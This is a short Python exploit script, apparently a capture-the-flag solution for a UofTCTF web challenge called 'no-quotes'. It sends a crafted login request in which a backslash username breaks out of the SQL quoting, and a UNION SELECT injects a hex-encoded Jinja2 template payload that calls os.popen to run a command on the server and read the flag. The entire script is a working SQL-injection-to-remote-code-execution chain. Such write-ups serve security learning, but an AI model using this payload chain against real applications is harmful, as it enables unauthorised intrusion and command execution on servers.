import requests
import re

url = "https://no-quotes-ce00461faeb24270.chals.uoftctf.org/"

payload = "{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('/readflag').read() }}"

res = requests.post(f'{url}/login', data={
    'username': '\\',
    'password': f') union select 1, 0x{payload.encode().hex()} #',
})

flag = re.findall(r'(uoftctf{.+})', res.text)[0]
print("Flag:", flag)